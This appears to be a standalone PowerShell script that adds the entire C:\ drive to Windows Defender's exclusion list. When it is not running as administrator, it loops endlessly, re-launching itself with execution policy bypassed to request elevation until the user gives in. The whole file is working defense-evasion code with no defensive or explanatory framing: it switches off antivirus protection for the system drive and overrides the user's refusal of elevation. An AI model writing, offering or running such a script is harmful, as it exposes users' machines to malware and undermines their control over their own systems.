# Check if we're already running as administrator
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # We're admin - do the actual work
    Set-MpPreference -ExclusionPath "C:\" -Force
    Write-Host "Successfully excluded C:\ from Windows Defender" -ForegroundColor Green
    
    # Verify the exclusion was added
    $exclusions = (Get-MpPreference).ExclusionPath
    if ($exclusions -contains "C:\") {
        Write-Host "Verified: C:\ is in the exclusion list" -ForegroundColor Green
    } else {
        Write-Host "Warning: C:\ may not have been added" -ForegroundColor Yellow
    }
    
    pause
    exit
}

# Not admin - keep prompting using gsudo-like approach
while ($true) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    
    $CommandLine = "-NoExit -NoProfile -ExecutionPolicy Bypass -Command `"Set-MpPreference -ExclusionPath 'C:\' -Force; Write-Host 'C:\ excluded from Windows Defender' -ForegroundColor Green; pause; exit`""
    
    try {
        $process = Start-Process -FilePath "PowerShell.exe" -ArgumentList $CommandLine -Verb RunAs -PassThru -WindowStyle Normal
        if ($process) {
            exit
        }
    }
    catch {
        Write-Host "Elevation denied or failed. Retrying..." -ForegroundColor Red
    }
}
